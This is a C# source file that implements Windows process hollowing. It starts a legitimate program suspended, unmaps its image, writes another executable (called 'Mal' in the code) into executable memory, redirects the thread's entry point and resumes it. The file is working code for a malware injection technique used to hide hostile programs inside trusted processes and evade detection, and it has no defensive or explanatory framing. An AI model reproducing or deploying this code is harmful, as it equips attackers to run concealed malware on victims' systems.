using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using static ProcessHollowing.NativeStructs;
using static ProcessHollowing.NativeFunctions;


namespace ProcessHollowing
{
    class ProcessHollow
    {
        public static int IMAGE_DOS_HEADER_E_LFANEW = 0x03C;

        public static IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance = new IMAGE_DOS_HEADER();
        public static IMAGE_NT_HEADER64 IMAGE_NT_HEADER64_instance = new IMAGE_NT_HEADER64();
        public static IMAGE_FILE_HEADER IMAGE_FILE_HEADER_instance = new IMAGE_FILE_HEADER();

        public static IntPtr IMAGE_SECTION_HEADER_address = IntPtr.Zero;

        /* 
        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }
        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }
        */

        private static void InitPEHeaders(IntPtr MalFilePointer)
        {
            IMAGE_DOS_HEADER_instance = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(
               MalFilePointer,
               typeof(IMAGE_DOS_HEADER));

            IntPtr IMAGE_NT_HEADER64_address = MalFilePointer + IMAGE_DOS_HEADER_instance.e_lfanew;
            IMAGE_NT_HEADER64_instance = (IMAGE_NT_HEADER64)Marshal.PtrToStructure(
                IMAGE_NT_HEADER64_address,
                typeof(IMAGE_NT_HEADER64));

            IntPtr IMAGE_FILE_HEADER_address = (IntPtr)(IMAGE_NT_HEADER64_address + Marshal.SizeOf(IMAGE_NT_HEADER64_instance.Signature));
            IMAGE_FILE_HEADER_instance = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(
                IMAGE_FILE_HEADER_address,
                typeof(IMAGE_FILE_HEADER));

            IMAGE_SECTION_HEADER_address = (
                MalFilePointer + IMAGE_DOS_HEADER_instance.e_lfanew +
                Marshal.SizeOf(typeof(IMAGE_NT_HEADER64)));

            // IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = new IMAGE_SECTION_HEADER();
        }

        private static uint CopyHeaderAndSections(
            IntPtr MalFilePointer,
            IntPtr AllocatedRegionForMal,
            IntPtr OriProcess_handle,
            int Mal_elfanew,
            byte[] MalFileBytes)
        {
            // Copying header into the Allocated memory
            uint sizeOfMalHeaders = (uint)Marshal.ReadInt32(MalFilePointer, Mal_elfanew + 0x54);
            uint lpNumberOfBytesWritten = 0;
            uint nt_status = NtWriteVirtualMemory(
                OriProcess_handle,
                AllocatedRegionForMal,
                MalFilePointer,
                sizeOfMalHeaders,
                ref lpNumberOfBytesWritten
            );

            IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = new IMAGE_SECTION_HEADER();


            // Copying Sections into the Allocated memory
            for (int count = 0; count < IMAGE_FILE_HEADER_instance.NumberOfSections; count++)
            {
                IMAGE_SECTION_HEADER_instance = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(
                    IMAGE_SECTION_HEADER_address + count * Marshal.SizeOf(IMAGE_SECTION_HEADER_instance),
                    typeof(IMAGE_SECTION_HEADER));

                Console.WriteLine(IMAGE_SECTION_HEADER_instance.SectionName);

                UInt64 virtualAddress = IMAGE_SECTION_HEADER_instance.VirtualAddress;
                Console.WriteLine($"\t[*] Relative Virtual Address: 0x{virtualAddress:X2}");

                UInt64 sizeOfRawData = IMAGE_SECTION_HEADER_instance.SizeOfRawData;
                Console.WriteLine($"\t[*] Size of Raw Data: 0x{sizeOfRawData:X2}");

                UInt64 pointerToRawData = IMAGE_SECTION_HEADER_instance.PointerToRawData;
                Console.WriteLine($"\t[*] Pointer to Raw Data: 0x{pointerToRawData:X2}");

                UInt64 Allocate_address = (UInt64)AllocatedRegionForMal + virtualAddress;
                UInt64 Allocate_offset = (UInt64)MalFilePointer + pointerToRawData;

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(MalFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);

                nt_status = NtWriteVirtualMemory(
                    OriProcess_handle,
                    (IntPtr)Allocate_address,
                    Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0),
                    (uint)bRawData.Length,
                    ref lpNumberOfBytesWritten
                );

                if (nt_status != 0)
                {
                    Console.WriteLine("Section Copy failed");
                }
            }

            return nt_status;
        }

        /*
        private static void UpdateEntryAndImageBase(
            IntPtr Mal_ImageBase, 
            IntPtr OriProcess_handle,
            ulong ImageBase_Pointer_address,
            IntPtr MalFilePointer,
            int Mal_elfanew,
            CONTEXT64 OriThreadContext_get,
            IntPtr AllocatedRegionForMal)
        {
            byte[] bImageBase = BitConverter.GetBytes((long)Mal_ImageBase);
            uint lpNumberOfBytesWritten = 0; ;

            uint nt_status = NtWriteVirtualMemory(
                OriProcess_handle,
                (IntPtr)ImageBase_Pointer_address,
                Marshal.UnsafeAddrOfPinnedArrayElement(bImageBase, 0),
                (uint)Marshal.SizeOf(Mal_ImageBase),
                 ref lpNumberOfBytesWritten
            );

            // Console.WriteLine($"[+] ReWriting {Path.GetFileName(MalPath)}'s ImageBase 0x{Mal_ImageBase:X2} in memory");

            UInt32 MalEntryPointRVA = (UInt32)Marshal.ReadInt32(MalFilePointer, Mal_elfanew + 0x28);
            OriThreadContext_get.Rcx = (ulong)AllocatedRegionForMal + (ulong)MalEntryPointRVA;
            // OriThreadContext_get.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
            Marshal.StructureToPtr(OriThreadContext_get, OriThreadContext_address, true);

            SetThreadContext(OriThread_handle, OriThreadContext_address);
        }
        */


        // Creating the Hollowing Process
        public static void CreateProcess_custom(string OriPath, string MalPath)
        {
            //Paths to our files # 00007ff7`44620000          
            
            // string OriPath = @"C:\Windows\System32\mspaint.exe";
            // string MalPath = @"C:\Windows\System32\cmd.exe";

            byte[] MalFileBytes = File.ReadAllBytes(MalPath);
            IntPtr MalFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(MalFileBytes, 0);

            // Init PE headers info
            InitPEHeaders(MalFilePointer);

            //Create the hollowing process ins suspended state    
            STARTUPINFO STARTUPINFO_instance = new STARTUPINFO();
            PROCESS_INFORMATION PROCESS_INFORMATION_instance = new PROCESS_INFORMATION();

            bool nt_createstatus = CreateProcess(
                null,
                OriPath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref STARTUPINFO_instance,
                out PROCESS_INFORMATION_instance
            );

            if (nt_createstatus)
            {
                Console.WriteLine("Successfully created the process...");
                IntPtr OriThread_handle = PROCESS_INFORMATION_instance.hThread;
                IntPtr OriProcess_handle = PROCESS_INFORMATION_instance.hProcess;

                // push the context into address
                CONTEXT64 OriThread_context = new CONTEXT64() { ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL };
                IntPtr OriThreadContext_address = Marshal.AllocHGlobal(Marshal.SizeOf(OriThread_context));
                Marshal.StructureToPtr(OriThread_context, OriThreadContext_address, false);

                // Get ImageBase address from PEB;
                GetThreadContext(OriThread_handle, OriThreadContext_address);
                CONTEXT64 OriThreadContext_get = (CONTEXT64)Marshal.PtrToStructure(OriThreadContext_address, typeof(CONTEXT64));
                UInt64 PEB_rdx_address = OriThreadContext_get.Rdx;
                UInt64 ImageBase_Pointer_address = PEB_rdx_address + 16;

                // Read ImageBase Address
                IntPtr ImageBase_address = Marshal.AllocHGlobal(8);
                RtlZeroMemory(ImageBase_address, 8);

                // Console.WriteLine($"[+] Reading ImageBase from {Path.GetFileName(victimPath)}'s ImageBase Address");
                uint nt_status = 0xffffff;
                uint outsize = 0;
                nt_status = NtReadVirtualMemory(
                    OriProcess_handle,
                    (IntPtr)ImageBase_Pointer_address,
                    ImageBase_address, 
                    (uint)Marshal.SizeOf(ImageBase_address), 
                    ref outsize
                );

      
                IntPtr ImageBase_address_read = Marshal.ReadIntPtr(ImageBase_address);
                nt_status = ZwUnmapViewOfSection(OriProcess_handle, ImageBase_address_read);

                int Mal_elfanew = Marshal.ReadInt32(MalFilePointer, IMAGE_DOS_HEADER_E_LFANEW);
                long Mal_ImageBase = Marshal.ReadInt64(MalFilePointer, Mal_elfanew + 0x30);
                uint SizeOfMalImage = (uint)Marshal.ReadInt32(MalFilePointer, Mal_elfanew + 0x50);
                IntPtr AllocatedRegionForMal = VirtualAllocEx(
                    OriProcess_handle,
                    (IntPtr)Mal_ImageBase,
                    SizeOfMalImage, 
                    AllocationType.Reserve | AllocationType.Commit, 
                    AllocationProtect.PAGE_EXECUTE_READWRITE);

                // Copy the header and sections into AllocatedRegionForMal
                // Get the header size
                nt_status = CopyHeaderAndSections(
                    MalFilePointer,
                    AllocatedRegionForMal, 
                    OriProcess_handle,
                    Mal_elfanew,
                    MalFileBytes);

                //update our ThreadContext's ImageBase and EntryPoint
                byte[] bImageBase = BitConverter.GetBytes((long)Mal_ImageBase);
                uint lpNumberOfBytesWritten = 0; ;

                nt_status = NtWriteVirtualMemory(
                    OriProcess_handle,
                    (IntPtr)ImageBase_Pointer_address,
                    Marshal.UnsafeAddrOfPinnedArrayElement(bImageBase, 0),
                    (uint)Marshal.SizeOf(Mal_ImageBase),
                     ref lpNumberOfBytesWritten
                );
                
                Console.WriteLine($"[+] ReWriting {Path.GetFileName(MalPath)}'s ImageBase 0x{Mal_ImageBase:X2} in memory");

                UInt32 MalEntryPointRVA = (UInt32)Marshal.ReadInt32(MalFilePointer, Mal_elfanew + 0x28);
                OriThreadContext_get.Rcx = (ulong)AllocatedRegionForMal + (ulong)MalEntryPointRVA;
                // OriThreadContext_get.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
                Marshal.StructureToPtr(OriThreadContext_get, OriThreadContext_address, true);

                SetThreadContext(OriThread_handle, OriThreadContext_address);
                ResumeThread(OriThread_handle);

            }
            else
            {
                Console.WriteLine("Failed to create process...");
            }

        }


    }
}
